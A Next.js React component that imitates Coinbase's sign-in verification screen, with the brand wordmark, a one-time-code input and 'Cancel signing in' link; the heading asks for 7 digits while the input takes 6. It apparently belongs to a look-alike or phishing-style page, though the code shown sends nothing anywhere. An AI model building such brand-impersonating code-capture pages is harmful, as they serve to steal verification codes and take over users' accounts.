'use client'
import Image from "next/image";
import OtpInput from 'react-otp-input';
import '@/css/first/main.css';
import { useEffect, useState } from "react";
export default function Home() {
  const [otp, setOtp] = useState('');
  return (
    <main className="ctw-flex ctw-flex-col ctw-items-center ctw-justify-between ctw-pt-[80px]">
      <div className="sm:ctw-w-full md:ctw-w-[448px] ctw-border-solid ctw-border-[1px]  ctw-rounded-[18px] ctw-border-gray-500 ctw-p-[40px] ctw-pb-[24px] ctw-pb-[24px]">
        <div className="ctw-pb-[56px]">
          <span className="ctw-text-3xl ctw-color-white">coinbase</span>
        </div>
        <div className="ctw-pb-[24px]">
          <h2 className="ctw-text-3xl">Enter the 7-digit code we texted to +* *******</h2>
          <span className="ctw-pt-[8px] ctw-text-u-gray">This helps us keep your account secure by verifying that it’s really you.</span>
        </div>
        <div className="ctw-pb-[40px] ctw-flex">
          <OtpInput
                className=""
                value={otp}
                onChange={setOtp}
                numInputs={6}
                containerStyle="ctw-pt-[26px] ctw-grid ctw-grid-cols-6 ctw-gap-2"
                inputStyle="active:ctw-bg-gray-800 active:ctw-border-blue-700 active:ctw-border-[1px] focus:ctw-border-blue-700 focus:ctw-border-[2px] active:ctw-border-[2px] ctw-text-center ctw-rounded-[4px] ctw-w-[48px] ctw-h-[55px] ctw-outline-none ctw-border-[1px] ctw-bg-u-black ctw-border-solid ctw-border-u-gray"
                renderSeparator={<span></span>}
                renderInput={(props) => <input {...props} />}
                skipDefaultStyles={true}
              />
        </div>
        <div className="ctw-mt-[32px] ctw-pb-[24px] ctw-text-center">
          <p className="ctw-text-blue-700 ctw-cursor-pointer">Having trouble? Try another way</p>
        </div>
      </div>
      <div className="ctw-py-[24px] ctw-text-center">
        <p className="ctw-cursor-pointer ctw-text-blue-700 ctw-text-xl">Cancel signing in</p>
      </div>
    </main>
  );
}
